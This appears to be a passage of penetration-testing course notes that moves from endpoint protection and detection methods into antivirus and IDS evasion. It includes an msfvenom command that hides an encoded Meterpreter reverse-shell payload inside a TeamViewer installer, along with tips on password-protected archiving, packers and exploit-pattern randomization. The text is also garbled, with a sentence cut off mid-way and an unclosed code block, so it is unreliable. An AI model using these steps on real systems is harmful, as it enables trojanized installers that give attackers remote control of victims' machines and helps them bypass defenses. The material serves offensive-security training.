## Endpoint Protection

`Endpoint protection` refers to any localized device or service whose sole purpose is to protect a single host on the network. The host can be a personal computer, a corporate workstation, or a server in a network's De-Militarized Zone (`DMZ`).

Endpoint protection usually comes in the form of software packs which include `Antivirus Protection`, `Antimalware Protection` (this includes bloatware, spyware, adware, scareware, ransomware), `Firewall`, and `Anti-DDOS` all in one, under the same software package. We are better familiarized with this form than the latter, as most of us are running endpoint protection software on our PCs at home or the workstations at our workplace. Avast, Nod32, Malwarebytes, and BitDefender are just some current names.
#### Perimeter Protection

`Perimeter protection` usually comes in physical or virtualized devices on the network perimeter edge. These `edge devices` themselves provide access `inside` of the network from the `outside`, in other terms, from `public` to `private`.

Between these two zones, on some occasions, we will also find a third one, called the De-Militarized Zone (`DMZ`), which was mentioned previously. This is a `lower-security policy level` zone than the `inside networks'` one, but with a higher `trust level` than the `outside zone`, which is the vast Internet. This is the virtual space where public-facing servers are housed, which push and pull data for public clients from the Internet but are also managed from the inside and updated with patches, information, and other data to keep the served information up to date and satisfy the customers of the servers.
## Security Policies

Security policies are the drive behind every well-maintained security posture of any network. They function the same way as ACL (Access Control Lists) do for anyone familiar with the Cisco CCNA educational material. They are essentially a list of `allow` and `deny` statements that dictate how traffic or files can exist within a network boundary. Multiple lists can act upon multiple network parts, allowing for flexibility within a configuration. These lists can also target different features of the network and hosts, depending on where they reside:

- Network Traffic Policies
- Application Policies
- User Access Control Policies
- File Management Policies
- DDoS Protection Policies
- Others

While not all of these categories above might have the words "Security Policy" attached to them, all of the security mechanisms around them operate on the same basic principle, the `allow` and `deny` entries. The only difference is the object target they refer to and apply to. So the question remains, how do we match events in the network with these rules so that the actions mentioned earlier can be taken?

There are multiple ways to match an event or object with a security policy entry:

| **Security Policy**                         | **Description**                                                                                                                                                                                                                                                                                                                   |
| ------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Signature-based Detection`                 | The operation of packets in the network and comparison with pre-built and pre-ordained attack patterns known as signatures. Any 100% match against these signatures will generate alarms.                                                                                                                                         |
| `Heuristic / Statistical Anomaly Detection` | Behavioral comparison against an established baseline included modus-operandi signatures for known APTs (Advanced Persistent Threats). The baseline will identify the norm for the network and what protocols are commonly used. Any deviation from the maximum threshold will generate alarms.                                   |
| `Stateful Protocol Analysis Detection`      | Recognizing the divergence of protocols stated by event comparison using pre-built profiles of generally accepted definitions of non-malicious activity.                                                                                                                                                                          |
| `Live-monitoring and Alerting (SOC-based)`  | A team of analysts in a dedicated, in-house, or leased SOC (Security Operations Center) use live-feed software to monitor network activity and intermediate alarming systems for any potential threats, either deciding themselves if the threat should be actioned upon or letting the automated mechanisms take action instead. |
## Evasion Techniques

Most host-based anti-virus software nowadays relies mainly on `Signature-based Detection` to identify aspects of malicious code present in a software sample.

Take a look at the snippet below to understand how msfvenom can embed payloads into any executable file:

```shell-session
alakin2504@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5

Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
```

 archiving it two times, passwording both archives upon creation, and removing the `.rar`/`.zip`/`.7z` extension from their names. For this purpose, we can install the [RAR utility](https://www.rarlab.com/download.htm) from RARLabs, which works precisely like WinRAR on Windows.

#### Archiving the Payload

  Firewall and IDS/IPS Evasion

```shell-session

alakin2504@htb[/htb]$ rar a ~/test.rar -p ~/test.js

## Packers

The term `Packer` refers to the result of an `executable compression` process where the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality. In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.

## Exploit Coding

When coding our exploit or porting a pre-existing one over to the Framework, it is good to ensure that the exploit code is not easily identifiable by security measures implemented on the target system.

For example, a typical `Buffer Overflow` exploit might be easily distinguished from regular traffic traveling over the network due to its hexadecimal buffer patterns. IDS / IPS placements can check the traffic towards the target machine and notice specific overused patterns for exploiting code.

When assembling our exploit code, randomization can help add some variation to those patterns, which will break the IPS / IDS database signatures for well-known exploit buffers. This can be done by inputting an `Offset` switch inside the code for the msfconsole module:

Code: ruby

```ruby
'Targets' =>
[
 	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```

Besides the BoF code, one should always avoid using obvious NOP sleds where the shellcode should land after the overflow is completed. Please note that the BoF code's purpose is to crash the service running on the target machine, while the NOP sled is the allocated memory where our shellcode (the payload) is inserted. IPS/IDS entities regularly check both of these, so it is good to test our custom exploit code against a sandbox environment before deploying it on the client network. Of course, we might only have one chance to do this correctly during an assessment.

For more information about exploit coding, we recommend checking out the [Metasploit - The Penetration Tester's Guide](https://nostarch.com/metasploit) book from No Starch Press. They delve into quite some detail about creating our exploits for the Framework.

Intrusion Prevention Systems and Antivirus Engines are the most common defender tools that can shoot down an initial foothold on the target. These mainly function on signatures of the whole malicious file or the stub stage.
